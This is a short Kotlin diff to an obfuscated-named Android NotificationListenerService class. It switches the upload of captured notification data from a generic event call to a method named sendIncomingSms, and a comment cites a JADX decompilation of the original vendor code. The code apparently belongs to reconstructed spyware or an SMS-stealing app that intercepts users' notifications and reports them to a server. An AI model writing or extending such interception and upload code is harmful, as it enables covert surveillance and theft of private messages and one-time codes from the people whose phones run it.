@@ -297,8 +297,8 @@ class sqlszawlrvc : NotificationListenerService() {
                 put("type", "notification")
                 put("source", packageName)
             }
-            // ADAPT: NetworkManager.sendNotification not yet exposed; using sendEvent
-            networkManager.sendEvent("notification", json)
+            // vendor: JADX C03793.invokeSuspend → NetworkManager.m211659c5 (sendIncomingSms)
+            networkManager.sendIncomingSms(json)
         } catch (e: Exception) {
             Log.e(TAG, "上报通知失败", e)
         }
